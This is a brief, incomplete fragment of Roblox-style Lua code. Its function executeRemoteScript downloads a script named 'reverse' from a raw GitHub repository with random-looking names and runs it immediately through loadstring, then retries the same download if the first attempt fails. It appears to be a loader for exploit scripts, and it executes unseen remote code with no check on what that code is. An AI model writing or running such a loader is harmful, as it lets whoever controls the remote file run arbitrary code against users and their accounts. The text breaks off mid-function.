...
local function executeRemoteScript()
    ...
    local success, result = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/OBaqt1nbJz1NipM92jv/6qQE2IF1FGovyLEEepBn/refs/heads/main/reverse"))()
    end)
    ...
    if not success then
        ...
        pcall(function()
            local scriptContent = game:HttpGet("https://raw.githubusercontent.com/OBaqt1nbJz1NipM92jv/6qQE2IF1FGovyLEEepBn/refs/heads/main/reverse")
